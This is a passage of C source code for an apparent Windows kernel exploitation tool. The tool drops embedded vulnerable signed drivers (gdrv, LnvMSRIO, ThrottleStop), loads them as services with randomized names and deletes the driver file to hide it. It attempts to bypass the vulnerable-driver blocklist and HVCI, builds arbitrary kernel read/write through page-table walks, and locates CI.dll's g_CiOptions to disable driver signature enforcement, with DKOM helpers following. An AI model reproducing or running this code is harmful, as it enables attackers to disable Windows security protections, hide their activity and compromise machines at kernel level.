        logf("[*] System EPROCESS at phys=0x%016llX DTB=0x%016llX",
             (unsigned long long)pa, (unsigned long long)dtb);
        return pa;
    }
    return 0;
}

/* Find System EPROCESS physical address.
 * Preferably scans only registry-derived RAM ranges so BYOVD physical reads
 * never touch GPU BAR / PCIe MMIO regions (common on Win11 24H2 systems with
 * discrete GPUs, where the BAR sits at e.g. 0xC0000000 or 0xB0000000 — reading
 * those via BYOVD causes a hardware fault → black screen / KMODE BSOD). */
static UINT64 find_system_eprocess_phys(void) {
    build_ram_ranges();

    if (g_nRanges > 0) {
        /* Scan only known RAM pages — skips all MMIO/GPU BAR regions */
        for (int ri = 0; ri < g_nRanges; ri++) {
            UINT64 r_base = (g_physRanges[ri].base + 0xFFFULL) & ~0xFFFULL;
            UINT64 r_end  =  g_physRanges[ri].base + g_physRanges[ri].len;
            if (r_end  > 0x100000000ULL) r_end = 0x100000000ULL; /* first 4GB only */
            if (r_base >= r_end) continue;
            UINT64 pa = scan_eprocess_range(r_base, r_end);
            if (pa) return pa;
        }
        logf("[!] System EPROCESS not found in RAM ranges — retrying with linear fallback");
    }

    /* Fallback: conservative linear scan 1MB–4GB, MMIO skips inline */
    UINT64 pa = scan_eprocess_range(0x1000, 0x100000000ULL);
    if (!pa) logf("[!] System EPROCESS not found in linear scan");
    return pa;
}

/* x64 page table walk: kva → physical address */
static UINT64 kva_to_phys(UINT64 cr3, UINT64 kva) {
    /* PML4 index [47:39], PDPT [38:30], PD [29:21], PT [20:12], offset [11:0] */
    UINT64 pml4e_pa = (cr3 & ~0xFFFULL) | (((kva>>39)&0x1FF)<<3);
    UINT64 pml4e = pr8(pml4e_pa);
    if(!(pml4e&1)) return 0;  /* not present */
    UINT64 pdpte_pa = (pml4e&~0xFFFULL&0x000FFFFFFFFFFFFULL) | (((kva>>30)&0x1FF)<<3);
    UINT64 pdpte = pr8(pdpte_pa);
    if(!(pdpte&1)) return 0;
    if(pdpte&(1ULL<<7)) { /* 1GB page */
        return (pdpte&~0x3FFFFFFFULL&0x000FFFFFFFFFFFFULL)|(kva&0x3FFFFFFF);
    }
    UINT64 pde_pa = (pdpte&~0xFFFULL&0x000FFFFFFFFFFFFULL) | (((kva>>21)&0x1FF)<<3);
    UINT64 pde = pr8(pde_pa);
    if(!(pde&1)) return 0;
    if(pde&(1ULL<<7)) { /* 2MB page */
        return (pde&~0x1FFFFFULL&0x000FFFFFFFFFFFFULL)|(kva&0x1FFFFF);
    }
    UINT64 pte_pa = (pde&~0xFFFULL&0x000FFFFFFFFFFFFULL) | (((kva>>12)&0x1FF)<<3);
    UINT64 pte = pr8(pte_pa);
    if(!(pte&1)) return 0;
    return (pte&~0xFFFULL&0x000FFFFFFFFFFFFULL)|(kva&0xFFF);
}

/* Validate CR3 by walking page tables for ntoskrnl_kva and comparing result to ntoskrnl_phys.
   If the CR3 is garbage (from a false-positive EPROCESS hit), kwrite would corrupt random
   physical memory → KMODE_EXCEPTION_NOT_HANDLED BSOD. */
static BOOL validate_cr3(UINT64 cr3, UINT64 ntoskrnl_kva, UINT64 ntoskrnl_phys) {
    if(!cr3||(cr3&0xFFF)) return FALSE;
    UINT64 computed=kva_to_phys(cr3,ntoskrnl_kva);
    if(!computed) return FALSE;
    /* allow ±4KB difference (image header page) */
    return (computed>>12)==(ntoskrnl_phys>>12);
}

/* bootstrap CR3 for physical backends */
static BOOL bootstrap_cr3(UINT64 ntoskrnl_kva) {
    if(g_cr3) return TRUE;

    UINT64 ntoskrnl_phys=0;
    UINT64 eproc_kva_hint=0;

    /* Get ntoskrnl physical base via 2MB scan; use it to read PsInitialSystemProcess
       so we know the expected System EPROCESS KVA for cross-validation. */
    ntoskrnl_phys=find_ntoskrnl_phys(ntoskrnl_kva);
    if(ntoskrnl_phys) {
        UINT32 rva=phys_pe_export_rva(ntoskrnl_phys,"PsInitialSystemProcess");
        if(rva) {
            eproc_kva_hint=pr8(ntoskrnl_phys+rva);
            logf("[*] PsInitialSystemProcess KVA=0x%016llX",(unsigned long long)eproc_kva_hint);
        }
    }

    /* Brute-force scan physical memory for System EPROCESS */
    UINT64 eproc_phys=find_system_eprocess_phys();
    if(!eproc_phys){logf("[!] EPROCESS not found in physical scan.");return FALSE;}

    UINT64 cr3_cand=pr8(eproc_phys+EPROC_DTB);
    logf("[*] EPROCESS phys=0x%016llX DTB=0x%016llX",
         (unsigned long long)eproc_phys,(unsigned long long)cr3_cand);

    /* Validate CR3 against known ntoskrnl mapping — rejects false-positive EPROCESS hits */
    if(ntoskrnl_phys && ntoskrnl_kva) {
        if(!validate_cr3(cr3_cand,ntoskrnl_kva,ntoskrnl_phys)){
            logf("[!] CR3=0x%016llX failed ntoskrnl validation — EPROCESS candidate is wrong, aborting.",
                 (unsigned long long)cr3_cand);
            return FALSE;
        }
        logf("[+] CR3=0x%016llX validated against ntoskrnl.",(unsigned long long)cr3_cand);
    } else if(ntoskrnl_kva) {
        /* ntoskrnl_phys not found (above 2GB scan range, or RAM ranges excluded it).
           Alternative validation: walk cr3_cand page tables for ntoskrnl_kva and verify
           the physical page contains an MZ header.  Prevents an unvalidated CR3 from a
           false-positive EPROCESS scan reaching kwrite — root cause of IRQL_NOT_LESS. */
        UINT64 ntos_pa = kva_to_phys(cr3_cand, ntoskrnl_kva);
        if (ntos_pa) {
            UINT64 mz = 0;
            phys_read8(ntos_pa, &mz);
            if ((mz & 0xFFFF) == 0x5A4D) {
                logf("[+] CR3=0x%016llX alt-validated: MZ at phys=0x%016llX",
                     (unsigned long long)cr3_cand, (unsigned long long)ntos_pa);
            } else {
                logf("[!] CR3=0x%016llX alt-validation failed (got 0x%04llX at ntos phys) — aborting.",
                     (unsigned long long)cr3_cand, (unsigned long long)(mz & 0xFFFF));
                return FALSE;
            }
        } else {
            logf("[!] CR3=0x%016llX: kva_to_phys(ntoskrnl_kva) returned 0 — aborting.",
                 (unsigned long long)cr3_cand);
            return FALSE;
        }
    }

    g_cr3          = cr3_cand;
    g_ntoskrnl_phys = ntoskrnl_phys; /* save for DKOM use */
    return g_cr3 != 0;
}

/* unified kread / kwrite (dispatch by backend) */
static BOOL kread(UINT64 kva, DWORD sz, UINT64 *out) {
    *out=0;
    if(g_backend==BE_GDRV) return gdrv_read(kva,sz,out);
    /* physical backends */
    if(!g_cr3) return FALSE;
    UINT64 pa=kva_to_phys(g_cr3,kva);
    if(!pa) return FALSE;
    /* read 8 bytes at aligned physical page, extract requested bytes */
    UINT64 aligned=pa&~7ULL;
    UINT64 qword=0;
    if(!phys_read8(aligned,&qword)) return FALSE;
    UINT32 shift=(UINT32)((pa&7)*8);
    UINT64 mask=(sz>=8)?~0ULL:((1ULL<<(sz*8))-1);
    *out=(qword>>shift)&mask;
    return TRUE;
}

static BOOL kwrite(UINT64 kva, UINT64 val, DWORD sz) {
    if(g_backend==BE_GDRV) return gdrv_write(kva,val,sz);
    if(!g_cr3) return FALSE;
    UINT64 pa=kva_to_phys(g_cr3,kva);
    if(!pa) return FALSE;
    /* RMW: read 8 bytes, patch bytes [pa&7 .. pa&7+sz-1], write back */
    UINT64 aligned=pa&~7ULL;
    /* Refuse writes to non-RAM physical addresses (MMIO/GPU BAR/page tables in
       wrong-CR3 scenario).  If the RAM range table is populated, the target must
       be inside a known RAM range.  Prevents IRQL_NOT_LESS_OR_EQUAL from writing
       to a physical address that maps to a PTE or MMIO region at DISPATCH_LEVEL. */
    if (g_nRanges > 0) {
        BOOL inRam = FALSE;
        for (int ri = 0; ri < g_nRanges; ri++)
            if (aligned >= g_physRanges[ri].base &&
                aligned <  g_physRanges[ri].base + g_physRanges[ri].len)
                { inRam = TRUE; break; }
        if (!inRam) {
            logf("[!] kwrite: pa=0x%016llX not in RAM ranges — refusing write",
                 (unsigned long long)aligned);
            return FALSE;
        }
    }
    UINT64 qword=0;
    phys_read8(aligned,&qword);
    UINT32 shift=(UINT32)((pa&7)*8);
    UINT64 mask=(sz>=8)?~0ULL:((1ULL<<(sz*8))-1);
    qword=(qword&~(mask<<shift))|((val&mask)<<shift);
    return phys_write8(aligned,qword);
}

/* ══════════════════════════════════════════════════════════════════════════
 * SCM helpers (shared across all backends)
 * ══════════════════════════════════════════════════════════════════════════*/

static BOOL drop_driver(const BYTE *data, DWORD sz, const char *suffix) {
    char myDir[MAX_PATH];
    GetModuleFileNameA(NULL,myDir,sizeof(myDir));
    char *sl=strrchr(myDir,'\\'); if(sl) sl[1]='\0'; else GetTempPathA(sizeof(myDir),myDir);
    snprintf(g_drvPath,MAX_PATH,"%shwsvc_%04X%s.sys",myDir,GetCurrentProcessId()&0xFFFF,suffix);
    HANDLE h=CreateFileA(g_drvPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE) return FALSE;
    DWORD wr=0; BOOL ok=WriteFile(h,data,sz,&wr,NULL); CloseHandle(h);
    return ok&&(wr==sz);
}

/* drop companion driver from embedded byte array — no external files needed */
static BOOL drop_embedded_sys(const BYTE *data, DWORD sz, const char *suffix) {
    char myDir[MAX_PATH];
    GetModuleFileNameA(NULL,myDir,sizeof(myDir));
    char *sl=strrchr(myDir,'\\'); if(sl) sl[1]='\0'; else GetTempPathA(sizeof(myDir),myDir);
    snprintf(g_drvPath,MAX_PATH,"%shwsvc_%04X%s.sys",myDir,GetCurrentProcessId()&0xFFFF,suffix);
    HANDLE h=CreateFileA(g_drvPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE){
        logf("[!] drop_embedded_sys: CreateFile('%s') err=%lu",g_drvPath,GetLastError());
        return FALSE;
    }
    DWORD wr=0; BOOL ok=WriteFile(h,data,sz,&wr,NULL); CloseHandle(h);
    if(!ok||wr!=sz){
        logf("[!] drop_embedded_sys: WriteFile err=%lu (wrote %lu/%lu)",GetLastError(),wr,sz);
        DeleteFileA(g_drvPath); return FALSE;
    }
    return TRUE;
}

static DWORD scm_start(const char *svcName) {
    /* kill stale service */
    SC_HANDLE hTmp=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(hTmp){
        SC_HANDLE hS=OpenServiceA(hTmp,svcName,SERVICE_STOP|DELETE|SERVICE_QUERY_STATUS);
        if(hS){
            SERVICE_STATUS ss={0}; ControlService(hS,SERVICE_CONTROL_STOP,&ss);
            Sleep(400); DeleteService(hS); CloseServiceHandle(hS);
            for(int i=0;i<25;i++){Sleep(100);
                SC_HANDLE hc=OpenServiceA(hTmp,svcName,SERVICE_QUERY_STATUS);
                if(!hc) break; CloseServiceHandle(hc);}}
        CloseServiceHandle(hTmp);
    }
    g_hScm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(!g_hScm) return GetLastError();
    g_hSvc=CreateServiceA(g_hScm,svcName,svcName,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,
                          SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE,
                          g_drvPath,NULL,NULL,NULL,NULL,NULL);
    if(!g_hSvc){
        DWORD e=GetLastError();
        if(e==ERROR_SERVICE_EXISTS||e==ERROR_SERVICE_MARKED_FOR_DELETE){
            if(e==ERROR_SERVICE_MARKED_FOR_DELETE){
                for(int i=0;i<20;i++){Sleep(200);
                    g_hSvc=CreateServiceA(g_hScm,svcName,svcName,SERVICE_ALL_ACCESS,
                                          SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
                                          SERVICE_ERROR_IGNORE,g_drvPath,NULL,NULL,NULL,NULL,NULL);
                    if(g_hSvc){g_ownSvc=TRUE;goto svc_rdy;}
                    e=GetLastError();
                    if(e!=ERROR_SERVICE_EXISTS&&e!=ERROR_SERVICE_MARKED_FOR_DELETE) return e;
                }
                return ERROR_SERVICE_MARKED_FOR_DELETE;
            }
            g_hSvc=OpenServiceA(g_hScm,svcName,SERVICE_ALL_ACCESS);
            if(!g_hSvc) return GetLastError();
        } else return e;
    } else g_ownSvc=TRUE;
svc_rdy:
    if(!StartServiceA(g_hSvc,0,NULL)){
        DWORD e=GetLastError();
        if(e==ERROR_SERVICE_ALREADY_RUNNING) goto open_dev;
        if(e==577||e==1275||e==ERROR_ACCESS_DENIED){
            logf("[!] %s blocked (err %lu) — VDB/HVCI fix applied, retry...",svcName,e);
            apply_vdb_hvci_fix(); Sleep(700);
            if(g_hSvc){SERVICE_STATUS ss={0};
                ControlService(g_hSvc,SERVICE_CONTROL_STOP,&ss);
                DeleteService(g_hSvc); CloseServiceHandle(g_hSvc); g_hSvc=NULL; g_ownSvc=FALSE;}
            Sleep(300);
            g_hSvc=CreateServiceA(g_hScm,svcName,svcName,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,
                                  SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE,
                                  g_drvPath,NULL,NULL,NULL,NULL,NULL);
            if(!g_hSvc&&GetLastError()==ERROR_SERVICE_EXISTS)
                g_hSvc=OpenServiceA(g_hScm,svcName,SERVICE_ALL_ACCESS);
            else g_ownSvc=TRUE;
            if(g_hSvc&&StartServiceA(g_hSvc,0,NULL)){logf("[+] %s loaded after VDB fix.",svcName);goto open_dev;}
            DWORD e2=g_hSvc?GetLastError():(DWORD)ERROR_SERVICE_DOES_NOT_EXIST;
            if(e2==ERROR_SERVICE_ALREADY_RUNNING) goto open_dev;
            if(e2==1275||e2==ERROR_DRIVER_BLOCKED){
                /* Win11 23H2+ (build>=22631): gdrv is in WDAC base policy — reboot won't help.
                   Older builds: VDB registry change just applied, needs one reboot to take effect. */
                if(get_win_build()>=22631){
                    logf("[!] WDAC perm block on %s (build>=22631).",svcName);
                    g_wdac_hard=TRUE; return 3;
                }
                logf("[!] %s still blocked (err %lu) — reboot needed.",svcName,e2); return 2;
            }
            logf("[!] %s retry failed err %lu",svcName,e2); return 1;
        }
        if(e==ERROR_SERVICE_MARKED_FOR_DELETE){
            if(g_hSvc){CloseServiceHandle(g_hSvc);g_hSvc=NULL;}
            Sleep(1200);
            g_hSvc=CreateServiceA(g_hScm,svcName,svcName,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,
                                  SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE,
                                  g_drvPath,NULL,NULL,NULL,NULL,NULL);
            if(!g_hSvc) return GetLastError();
            g_ownSvc=TRUE;
            if(!StartServiceA(g_hSvc,0,NULL)){e=GetLastError();
                if(e==ERROR_SERVICE_ALREADY_RUNNING) goto open_dev;
                return e;}
            goto open_dev;
        }
        logf("[!] StartService(%s) err %lu",svcName,e); return e;
    }
open_dev:{
        Sleep(500);
        const char *devPath=(g_backend==BE_GDRV)?GIO_DEVICE_PATH:
                            (g_backend==BE_LNV)?LNV_DEVICE_PATH:TS_DEVICE_PATH;
        /* for TS, device name matches service name */
        char tsDev[64]; if(g_backend==BE_TS){snprintf(tsDev,sizeof(tsDev),"\\\\.\\%s",svcName);devPath=tsDev;}
        g_hDev=CreateFileA(devPath,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
        if(g_hDev==INVALID_HANDLE_VALUE){
            logf("[!] Cannot open device '%s' err %lu",devPath,GetLastError());
            return GetLastError();
        }
        /* kernel holds a ref — file can be deleted while driver stays loaded */
        DeleteFileA(g_drvPath);
        logf("[+] device '%s' open, .sys artifact nuked from disk.",devPath); return 0;
    }
}

static void scm_unload_current(void) {
    if(g_hDev!=INVALID_HANDLE_VALUE){CloseHandle(g_hDev);g_hDev=INVALID_HANDLE_VALUE;}
    if(g_hSvc){
        SERVICE_STATUS ss={0}; ControlService(g_hSvc,SERVICE_CONTROL_STOP,&ss); Sleep(400);
        if(g_ownSvc) DeleteService(g_hSvc);
        CloseServiceHandle(g_hSvc); g_hSvc=NULL;
    }
    if(g_hScm){CloseServiceHandle(g_hScm);g_hScm=NULL;}
    if(g_drvPath[0]){DeleteFileA(g_drvPath);g_drvPath[0]=0;}
    g_ownSvc=FALSE; g_cr3=0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * BOOTSTRAP: try backends in order
 * ══════════════════════════════════════════════════════════════════════════*/
static DWORD try_backend(Backend be, UINT64 ntoskrnl_kva) {
    g_backend=be;
    DWORD le=0;
    /* Regenerate a fresh random name for each backend attempt so stale entries don't collide */
    init_rand_svc(); g_randSvc[7]=(char)('a'+(be&0xF)); /* backend suffix keeps names distinct */
    if(be==BE_GDRV) {
        if(!drop_driver(GDRV64_SYS_DATA,GDRV64_SYS_SIZE,"_gio")) return 1;
        le=scm_start(g_randSvc);
    } else if(be==BE_LNV) {
        if(!drop_embedded_sys(LNV_SYS_DATA,LNV_SYS_SIZE,"_lnv")) return 1;
        le=scm_start(g_randSvc);
        if(le==0) {
            if(!bootstrap_cr3(ntoskrnl_kva)){
                logf("[!] LNV backend: CR3 not found");
                scm_unload_current(); return 1;
            }
        }
    } else { /* BE_TS */
        if(!drop_embedded_sys(TS_SYS_DATA,TS_SYS_SIZE,"_ts")) return 1;
        le=scm_start(g_randSvc);
        if(le==0) {
            if(!bootstrap_cr3(ntoskrnl_kva)){
                logf("[!] TS backend: CR3 not found");
                scm_unload_current(); return 1;
            }
        }
    }
    return le;
}

static DWORD bootstrap_driver(UINT64 ntoskrnl_kva) {
    apply_vdb_hvci_fix(); Sleep(400);
    g_wdac_hard = FALSE;
    DWORD best_ec = 1;

    /* Backend 1: gdrv.sys — skip on Win11 23H2+ (WDAC base policy blocks it permanently) */
    if(get_win_build() < 22631) {
        logf("[*] Trying gdrv.sys...");
        DWORD le=try_backend(BE_GDRV,ntoskrnl_kva);
        if(le==0){logf("[+] gdrv.sys loaded.");return 0;}
        logf("[!] gdrv failed (le=%lu).",le);
        if(le==2) best_ec=2;
        scm_unload_current();
    } else {
        logf("[*] Win11 23H2+ detected — skipping gdrv, going directly to LNV/TS.");
    }

    /* Backend 2: LnvMSRIO.sys */
    {
        DWORD le=try_backend(BE_LNV,ntoskrnl_kva);
        if(le==0){logf("[+] LnvMSRIO loaded.");return 0;}
        if(le==3){logf("[!] LNV: WDAC permanent");}
        else if(le==2){logf("[!] LNV: needs reboot"); if(best_ec!=2) best_ec=2;}
        logf("[!] LNV failed (le=%lu), trying ThrottleStop...",le);
        scm_unload_current();
    }

    /* Backend 3: ThrottleStop.sys */
    {
        DWORD le=try_backend(BE_TS,ntoskrnl_kva);
        if(le==0){logf("[+] ThrottleStop loaded.");return 0;}
        logf("[!] ThrottleStop failed (le=%lu)",le);
        scm_unload_current();
    }

    /* All backends failed — return the most actionable error */
    if(g_wdac_hard && best_ec!=2) return 3; /* permanent WDAC block, no reboot will fix */
    if(is_hvci_live()) return 2;
    return best_ec;
}

/* ══════════════════════════════════════════════════════════════════════════
 * CI.dll scanner + patch/restore
 * ══════════════════════════════════════════════════════════════════════════*/

/* Precise g_CiOptions location via CiInitialize → CipInitialize → pattern.
 * Ported from GDRVLoader/swind2.cpp QueryCiOptions.
 * Maps CI.dll as SEC_IMAGE (same RVA layout as kernel), follows the call chain,
 * resolves g_CiOptions RVA, returns ci_base + RVA.
 * No kernel read needed — avoids SMAP entirely. */
static UINT64 find_ci_options_precise(UINT64 ci_base) {
    char path[MAX_PATH]; GetSystemDirectoryA(path, sizeof(path));
    strncat(path, "\\CI.dll", sizeof(path)-strlen(path)-1);
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if(hf == INVALID_HANDLE_VALUE) { logf("[!] precise: open CI.dll err=%lu", GetLastError()); return 0; }
    HANDLE hm = CreateFileMappingA(hf, NULL, PAGE_READONLY|(DWORD)0x1000000/*SEC_IMAGE*/, 0, 0, NULL);
    CloseHandle(hf);
    if(!hm) { logf("[!] precise: CreateFileMapping err=%lu", GetLastError()); return 0; }
    BYTE *img = (BYTE*)MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hm);
    if(!img) { logf("[!] precise: MapViewOfFile err=%lu", GetLastError()); return 0; }

    UINT64 result = 0;
    DWORD expRVA = 0;
    DWORD nNames = 0;
    DWORD *pNames = NULL;
    WORD  *pOrds  = NULL;
    DWORD *pFuncs = NULL;
    UINT64 ciInit = 0;

    /* Find CiInitialize in the mapped image via PE exports */
    DWORD peOff = *(DWORD*)(img + 0x3C);
    if(*(DWORD*)(img + peOff) != 0x00004550 || *(WORD*)(img + peOff + 0x18) != 0x020B)
        { logf("[!] precise: CI.dll PE magic mismatch"); goto done; }
    expRVA = *(DWORD*)(img + peOff + 0x18 + 0x70);
    if(!expRVA) { logf("[!] precise: no export dir"); goto done; }
    nNames = *(DWORD*)(img + expRVA + 0x18);
    pNames = (DWORD*)(img + *(DWORD*)(img + expRVA + 0x20));
    pOrds  = (WORD* )(img + *(DWORD*)(img + expRVA + 0x24));
    pFuncs = (DWORD*)(img + *(DWORD*)(img + expRVA + 0x1C));
    for(DWORD i = 0; i < nNames; i++) {
        const char *nm = (const char*)(img + pNames[i]);
        if(strcmp(nm, "CiInitialize") == 0) { ciInit = (UINT64)(img + pFuncs[pOrds[i]]); break; }
    }
    if(!ciInit) { logf("[!] precise: CiInitialize export not found"); goto done; }
    logf("[*] precise: CiInitialize mapped+0x%llX", (unsigned long long)(ciInit-(UINT64)img));

    /* Scan up to 512 bytes from CiInitialize for the CipInitialize CALL pattern.
     * Win10 1709+ (build>=16299): 4C 8B CB 4C 8B C7 48 8B D6 8B CD E8 [disp32]
     * Older:                      41 8B CA 48 83 C4 28 E9 [disp32]           */
    {
        static const BYTE cpat_new[] = {0x4c,0x8b,0xcb,0x4c,0x8b,0xc7,0x48,0x8b,0xd6,0x8b,0xcd,0xe8};
        static const BYTE cpat_old[] = {0x41,0x8b,0xca,0x48,0x83,0xc4,0x28,0xe9};
        const BYTE *cpat = (get_win_build() >= 16299) ? cpat_new : cpat_old;
        DWORD cplen = (get_win_build() >= 16299) ? 12 : 8;
        int cipOff = -1;
        for(int i = 0; i < 512; i++) {
            BOOL m = TRUE;
            for(DWORD j = 0; j < cplen; j++) if(((BYTE*)ciInit)[i+j] != cpat[j]) { m=FALSE; break; }
            if(m) cipOff = i;
        }
        if(cipOff < 0) { logf("[!] precise: CipInit pattern not found"); goto done; }
        INT32 cipDisp = *(INT32*)((BYTE*)ciInit + cipOff + cplen);
        UINT64 cipInit = (UINT64)ciInit + cipOff + cplen + 4 + cipDisp;
        logf("[*] precise: CipInitialize mapped+0x%llX", (unsigned long long)(cipInit-(UINT64)img));

        /* Scan up to 512 bytes from CipInitialize for g_CiOptions assignment.
         * Pattern: 49 8B E9 89 0D [disp32]  (MOV [RIP+disp32], ECX with REX.B) */
        static const BYTE gpat[] = {0x49,0x8b,0xe9,0x89,0x0d};
        int goOff = -1;
        for(int i = 0; i < 512; i++) {
            BOOL m = TRUE;
            for(DWORD j = 0; j < 5; j++) if(((BYTE*)cipInit)[i+j] != gpat[j]) { m=FALSE; break; }
            if(m) goOff = i;
        }
        if(goOff < 0) { logf("[!] precise: g_CiOptions pattern not found"); goto done; }
        INT32 goDisp = *(INT32*)((BYTE*)cipInit + goOff + 5);
        UINT64 mapped_gco = (UINT64)cipInit + goOff + 5 + 4 + goDisp;
        result = ci_base + (mapped_gco - (UINT64)img);
        logf("[*] precise: g_CiOptions RVA=0x%08llX KVA=0x%016llX",
             (unsigned long long)(mapped_gco-(UINT64)img), (unsigned long long)result);
    }
done:
    UnmapViewOfFile(img);
    return result;
}
#define MAX_CAND 32
#define MAX_SECTS 32
typedef struct{char name[9];ULONG vaddr;ULONG vsz;DWORD chars;} SECT_INFO;
/* IMAGE_SCN_MEM_WRITE=0x80000000 — only candidates in writable sections are safe to patch */

static UINT64 get_ci_base(ULONG *out_vsz) {
    ULONG needed=0; void *buf=NULL; NTSTATUS st;
    do{needed+=0x10000;free(buf);buf=malloc(needed);if(!buf)return 0;
       st=g_NtQSI(11,buf,needed,&needed);}while(st==STATUS_INFO_LEN_MISMATCH);
    if(st){free(buf);return 0;}
    SYS_MODULE_INFO *info=(SYS_MODULE_INFO*)buf; UINT64 base=0;
    for(ULONG i=0;i<info->NumberOfModules;i++){
        SYS_MODULE_ENTRY *e=&info->Modules[i];
        const char*full=(const char*)e->FullPathName,*sl=strrchr(full,'\\'),*name=sl?sl+1:full;
        if(_stricmp(name,"ci.dll")==0){
            base=(UINT64)(ULONG_PTR)e->ImageBase;
            if(!base) base=(UINT64)(ULONG_PTR)e->MappedBase;
            if(out_vsz) *out_vsz=e->ImageSize;
            logf("[*] ci.dll base=0x%016llX vsz=0x%lX",(unsigned long long)base,e->ImageSize);
            break;
        }
    }
    free(buf); return base;
}

static ULONG scan_ci_options(UINT64 ci_base,ULONG ci_vsz,UINT64 *out,ULONG max_out) {
    char path[MAX_PATH]; GetSystemDirectoryA(path,sizeof(path));
    strncat(path,"\\ci.dll",sizeof(path)-strlen(path)-1);
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    if(fsz==INVALID_FILE_SIZE||fsz<0x400){CloseHandle(hf);return 0;}
    BYTE*img=(BYTE*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,img,fsz,&rd,NULL); CloseHandle(hf);
    if(rd!=fsz){free(img);return 0;}
    DWORD peOff=*(DWORD*)(img+0x3C);
    if((SIZE_T)peOff+0x18+0x70>fsz||*(DWORD*)(img+peOff)!=0x00004550){free(img);return 0;}
    WORD nsec=*(WORD*)(img+peOff+6),optSz=*(WORD*)(img+peOff+0x14),optMg=*(WORD*)(img+peOff+0x18);
    DWORD imgV=ci_vsz;
    if(!imgV){DWORD vsOff=peOff+0x18+(optMg==0x20B?0x38u:0x30u);
              if((SIZE_T)vsOff+4<=fsz) imgV=*(DWORD*)(img+vsOff);}
    if(!imgV) imgV=fsz;
    if(!nsec||nsec>96){free(img);return 0;}
    BYTE*secHdr=img+peOff+0x18+optSz;
    if((SIZE_T)(secHdr-img)+(SIZE_T)nsec*40>fsz){free(img);return 0;}
    SECT_INFO sects[MAX_SECTS]; WORD nsi=0;
    BYTE*txtRaw=NULL; ULONG txtVA=0,txtSz=0;
    for(WORD i=0;i<nsec&&nsi<MAX_SECTS;i++){
        BYTE*s=secHdr+(SIZE_T)i*40;
        memset(sects[nsi].name,0,sizeof(sects[nsi].name)); memcpy(sects[nsi].name,s,8);
        sects[nsi].vaddr=*(DWORD*)(s+12);
        DWORD rawSz=*(DWORD*)(s+16),virSz=*(DWORD*)(s+8);
        sects[nsi].vsz=virSz>rawSz?virSz:rawSz;
        sects[nsi].chars=*(DWORD*)(s+36);  /* section characteristics */
        nsi++;
        if(memcmp(s,".text",5)==0){DWORD rawOff=*(DWORD*)(s+20);
            txtVA=*(DWORD*)(s+12);txtSz=rawSz;
            if((SIZE_T)rawOff+txtSz<=fsz) txtRaw=img+rawOff;}
    }
    if(!txtRaw){free(img);return 0;}
    ULONG nCand=0; ULONG seenRva[MAX_CAND]={0};
    for(ULONG i=0;i+8<txtSz&&nCand<max_out;){
        BYTE*p=txtRaw+i;
        ULONG skip=((p[0]&0xF0)==0x40&&i+9<txtSz)?1u:0u;
        BYTE*q=p+skip; ULONG ilen=0; BYTE*disp=NULL;
        if     (q[0]==0x89&&(q[1]&0xC7)==0x0D)                 {ilen=skip+6;disp=q+2;}
        else if(q[0]==0x0F&&q[1]==0xB6&&(q[2]&0xC7)==0x05)     {ilen=skip+7;disp=q+3;}
        else if(q[0]==0x8A&&(q[1]&0xC7)==0x05)                 {ilen=skip+6;disp=q+2;}
        else if(q[0]==0x88&&(q[1]&0xC7)==0x05)                 {ilen=skip+6;disp=q+2;}
        else if(q[0]==0x80&&q[1]==0x3D&&i+skip+7<txtSz)        {ilen=skip+7;disp=q+2;}
        else if(q[0]==0xF6&&q[1]==0x05&&i+skip+7<txtSz)        {ilen=skip+7;disp=q+2;}
        else if(q[0]==0x80&&q[1]==0x0D&&i+skip+7<txtSz)        {ilen=skip+7;disp=q+2;}
        else if(q[0]==0x80&&q[1]==0x25&&i+skip+7<txtSz)        {ilen=skip+7;disp=q+2;}
        if(disp&&ilen){
            INT32 d=*(INT32*)disp;
            INT64 rva=(INT64)(txtVA+i+ilen)+(INT64)d;
            if(rva>0&&(ULONG)rva<imgV){
                /* Only include candidates that land in a writable (non-exec, non-readonly) section.
                   Using IMAGE_SCN_MEM_WRITE(0x80000000) is safer than a name allowlist — it catches
                   .rsrc, .reloc, .edata etc. that a name check would miss.  Writing to a read-only
                   kernel section via gdrv → access violation in kernel → KMODE_EXCEPTION_NOT_HANDLED. */
                BOOL writable=FALSE;
                for(WORD si=0;si<nsi;si++)
                    if(sects[si].vaddr<=(ULONG)rva&&(ULONG)rva<sects[si].vaddr+sects[si].vsz)
                        {writable=(sects[si].chars&0x80000000u)!=0;break;}
                if(writable){
                    UINT64 kAddr=ci_base+(UINT64)(ULONG)rva;
                    BOOL dup=FALSE;
                    for(ULONG j=0;j<nCand;j++) if(seenRva[j]==(ULONG)rva){dup=TRUE;break;}
                    if(!dup){seenRva[nCand]=(ULONG)rva;out[nCand++]=kAddr;
                        logf("[*] CI cand RVA=0x%08lX KVA=0x%016llX chars=0x%08lX",
                             (ULONG)rva,(unsigned long long)kAddr,
                             (ULONG)sects[0].chars);} /* approximate — just log first sect */
                }
            }
            i+=ilen;
        } else i++;
    }
    free(img);logf("[*] %lu CI candidate(s)",nCand);return nCand;
}

/* ── DKOM helpers ─────────────────────────────────────────────────────────── */

/* Query NtQuerySystemInformation(11) and return the kernel ImageBase for the
